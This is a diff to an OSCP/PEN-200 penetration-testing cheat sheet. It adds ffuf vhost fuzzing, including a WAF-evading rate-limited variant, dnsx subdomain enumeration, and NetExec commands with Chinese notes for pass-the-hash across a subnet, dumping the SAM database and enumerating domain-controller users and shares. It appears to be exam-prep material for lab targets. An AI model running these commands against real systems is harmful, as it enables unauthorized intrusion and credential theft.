@@ -6,6 +6,10 @@ disqus: hackmd
 [OSCP, PEN-200] Cheat Sheet
 ===
 
+
+# Table of Contents
+[TOC]
+
 # Recon
 ## IP
 ### Nmap
@@ -39,10 +43,15 @@ disqus: hackmd
 ### ffuf
 - `ffuf -t 50 -r -w /usr/share/dirb/wordlists/common.txt -u http://192.168.171.219/FUZZ -e .git,.php,.bak,.zip`
 - `ffuf -t 50 -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.171.219/FUZZ -e ".php,.bak,.zip"`
-- Subdomain
-`ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.linkvortex.htb" -u http://linkvortex.htb -c -mc 200`
+- vhost
+`ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.linkvortex.htb" -u http://linkvortex.htb -c -mc 200`\
+WAF-safe: `ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.linkvortex.htb" -u http://linkvortex.htb -c -mc 200 -t 5 -rate 5 -p 0.1-0.3 -timeout 10 -ac`
+
 - File extension
 `ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://{IP}/FUZZ.zip`
+
+### Subdomain
+`dnsx -d {domain} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -silent`
 
 ### windows path traversal
 ![image](https://hackmd.io/_uploads/S1hg-Oankl.png)
@@ -222,6 +231,23 @@ nxc mssql 192.168.1.20 -u sa -p 'Passw0rd!' -x "SELECT @@version"
 
 #SSH
 nxc ssh 192.168.1.50 -u root -p toor -x "id"
+```
+> (`--shares` 透過 SMB Recon 較隱密)
+
+### Enum
+透過已知 User 驗證其他網段能登入權限
+```
+nxc smb 10.129.150.0/24 -u '<user>' -H '<user-hash>'
+```
+
+透過已知 User嘗試讀取 SAM 資料庫 (前提: `Pwn3d!`)
+```
+nxc smb 10.129.150.149 -u '<user>' -p '<user-pwd>' --sam 
+```
+
+找到 cred 訪問 Domain Controller
+```
+nxc ldap <dc-ip> -u '<user>' -p '<user-pwd>' --users --shares
 ```
 
 ### Password
